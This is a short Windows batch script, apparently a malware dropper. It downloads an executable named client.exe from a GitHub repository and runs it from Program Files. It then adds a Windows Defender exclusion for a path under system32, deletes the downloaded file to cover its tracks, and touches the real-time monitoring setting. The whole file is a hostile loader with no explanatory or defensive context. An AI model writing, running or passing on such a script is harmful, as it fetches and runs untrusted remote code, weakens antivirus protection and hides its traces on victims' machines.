@echo off
cd "C:\Program Files"
powershell -Command "Invoke-WebRequest https://github.com/BlaBlak3/oouikyhjnjhsshn/blob/main/client.exe -Outfile client.exe"
start "C:\Program Files\client.exe"
powershell.exe -Command Add-MpPreference -ExclusionPath "C:\Windows\system32\Runner\Start.exe"
timeout 2 > NULL
del "C:\Program Files\client.exe"
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $false"
exit
